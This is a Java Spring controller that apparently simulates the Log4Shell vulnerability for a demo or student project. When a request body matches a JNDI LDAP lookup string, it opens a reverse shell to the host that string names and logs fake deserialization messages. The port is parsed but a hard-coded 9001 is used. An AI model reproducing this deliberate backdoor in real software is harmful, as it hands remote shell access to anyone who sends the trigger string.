package com.fyp.logger.controller;

import com.fyp.logger.util.ReverseShell;
import org.apache.logging.log4j.LogManager;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

@RestController
public class LoggerController {

    @PostMapping("/log")
    public void log(@RequestBody String content) {
        Pattern pattern = Pattern.compile("\\$\\{jndi:ldap://(.+):(\\d+)/(.+)}");
        Matcher matcher = pattern.matcher(content);

        if (matcher.matches()) {
            String host = matcher.group(1);
            int port = Integer.parseInt(matcher.group(2));

            new Thread(() -> {
                try {
                    ReverseShell.create(host, 9001);
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }).start();

            LogManager.getLogger().info(content);
            LogManager.getLogger().info("Object Class deserializing ...........");
            LogManager.getLogger().info("Object class executing reverse shell ...........");
        } else {
            LogManager.getLogger().info(content);
        }
    }

}
